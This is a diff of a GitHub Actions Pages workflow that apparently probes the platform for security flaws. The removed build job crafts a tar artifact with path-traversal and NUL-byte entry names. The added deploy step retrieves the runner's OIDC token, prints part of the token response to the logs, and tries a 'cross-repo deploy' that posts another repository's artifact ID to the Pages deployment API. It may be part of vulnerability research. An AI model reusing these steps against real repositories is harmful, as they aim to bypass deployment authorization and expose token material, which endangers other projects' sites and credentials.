@@ -10,52 +10,31 @@ concurrency:
   group: pages
   cancel-in-progress: true
 jobs:
-  build:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Build artifact with weird paths
-        run: |
-          python3 - <<'PYEOF'
-          import tarfile, io
-          tf = tarfile.open('/tmp/artifact.tar', 'w')
-          ti = tarfile.TarInfo('index.html')
-          c = b'<h1>Pages Index</h1>\n'
-          ti.size = len(c); tf.addfile(ti, io.BytesIO(c))
-          
-          # Weird path tricks
-          tests = [
-            ('weird/../escaped.html', b'WEIRD_DOTDOT_INSIDE\n'),
-            ('./normal.html', b'NORMAL\n'),
-            ('a/b/../../../oob.html', b'OUT_OF_BOUNDS\n'),
-            ('//double_slash.html', b'DBLSLASH\n'),
-            ('a//b.html', b'INNER_DBLSLASH\n'),
-            ('NUL\x00file.html', b'NULBYTE\n'),
-            ('./.././escaped2.html', b'COMPLEX\n'),
-          ]
-          for name, content in tests:
-            try:
-              ti = tarfile.TarInfo(name)
-              ti.size = len(content)
-              tf.addfile(ti, io.BytesIO(content))
-              print(f"Added: {name!r}")
-            except Exception as e:
-              print(f"FAIL: {name!r}: {e}")
-          tf.close()
-          PYEOF
-          tar tvf /tmp/artifact.tar
-      - uses: actions/upload-artifact@v4
-        with:
-          name: github-pages
-          path: /tmp/artifact.tar
-          retention-days: 1
   deploy:
-    needs: build
     runs-on: ubuntu-latest
     environment:
       name: github-pages
       url: ${{ steps.deployment.outputs.page_url }}
     steps:
-      - id: deployment
-        uses: actions/deploy-pages@v4
-        with:
-          artifact_name: github-pages
+      - name: Get OIDC and call deployment API directly
+        env:
+          ACTIONS_RUNTIME_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          PAGES_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          ARTIFACT_ID: 6716804715
+        run: |
+          # Get OIDC token from Actions
+          OIDC=$(curl -sSL -X GET -H "User-Agent: actions/oidc-client" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=nobody")
+          echo "OIDC response (first 200 chars):"
+          echo "$OIDC" | head -c 200
+          OIDC_TOKEN=$(echo "$OIDC" | python3 -c "import json,sys;print(json.load(sys.stdin)['value'])" 2>/dev/null || echo "")
+          echo "Got OIDC token len: ${#OIDC_TOKEN}"
+          
+          # Try to deploy with repo B's artifact_id
+          echo "=== Attempting cross-repo deploy ==="
+          curl -sS -X POST \
+            -H "Authorization: bearer $GITHUB_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/fox32932/pages-test-cycle9/pages/deployment" \
+            -d "{\"artifact_id\":$ARTIFACT_ID,\"pages_build_version\":\"$GITHUB_SHA\",\"oidc_token\":\"$OIDC_TOKEN\"}" \
+            -w "\nHTTP %{http_code}\n"
